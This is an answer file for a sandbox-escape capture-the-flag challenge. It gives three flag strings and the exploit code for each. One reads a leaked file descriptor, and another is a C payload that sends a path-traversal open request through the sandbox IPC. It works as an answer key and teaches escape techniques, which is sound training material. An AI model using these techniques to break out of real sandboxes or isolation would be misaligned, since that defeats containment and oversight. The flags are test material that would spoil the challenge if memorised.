# Answers


## Flag 0

**Filename**: `/tmp/sandpit.sandbox/sandpit_flag0.txt`

**Content**: `flag{exit_light_enter_night}`

Can be read due to it being within the sandbox root.

```python
flag = open('sandpit_flag0.txt', 'r')
print(flag.read())
flag.close()
```


## Flag 1

**Filename**: `/tmp/sandpit_flag1.txt`

**Content**: `flag{this_is_sandpit_turtle}`

Can be read due to the open file handle in the sandbox left from before locking
the sandbox down.

```python
import os

os.lseek(3, 0, 0)
flag = os.read(3, 64)
print(flag)
```


## Flag 2

**Filename**: `/tmp/sandpit_flag2.txt`

**Content**: `flag{somebody_just_took_a_sandwich}`

Can be read by requesting it though the IPC.

I have no idea how to write the equivalent in Python, although it seems
possible. This is 95% blind copy/paste from
[the IPC client's source code](https://github.com/0x6c7862/sandpit/blob/master/src/ipc/mod.rs),
plus the parts at the start and end to send the initial command and read the
flag.

```c
/* Payload to read a file through the IPC.
 *
 * Adapted from "src/unix/extern_open.c".
 *
 * Compile with:
 *
 *   gcc -shared -lc -Wl,-soname,libpayload.so.1 -fPIC -o /tmp/payload.so payload.c
 */
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>

union cmsghdr_buf {
	struct cmsghdr align;
	char buf[CMSG_SPACE(sizeof(int))];
};

int payload(int socket) {
	struct msghdr msg = { 0 };

	/* Send open command */
	char cmd[] = "open /tmp/sandpit.sandbox/../sandpit_flag2.txt\x00";
	send(4, cmd, sizeof(cmd), 0);

	/* Allocate scatter-gather locations */
	char iov_buf[1] = { -1 };
	struct iovec iov = { .iov_base = &iov_buf, .iov_len = sizeof(iov_buf) };
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	/* Allocate access control messages */
	char buf[sizeof(union cmsghdr_buf)];
	msg.msg_control = buf;
	msg.msg_controllen = sizeof(buf);

	/* Wait for fd */
	ssize_t ret = recvmsg(socket, &msg, 0);
	if (ret < 0 || errno) {
		perror("recvmsg");
		return ret;
	}

	/* Extract status */
	if (*iov_buf != 0) {
		return -127;
	}

	/* Extract fd */
	struct cmsghdr *cmsgp = CMSG_FIRSTHDR(&msg);
	if (cmsgp == NULL) {
		errno = EINVAL;
		return -1;
	}

	/* Read fd */
	char read_buf[64];
	int fd = *((int *)CMSG_DATA(cmsgp));
	if (read(fd, read_buf, sizeof(read_buf)) < 0 || errno) {
		perror("read");
		return -1;
	}

	/* Print flag */
	puts(read_buf);

	return 0;
}
```
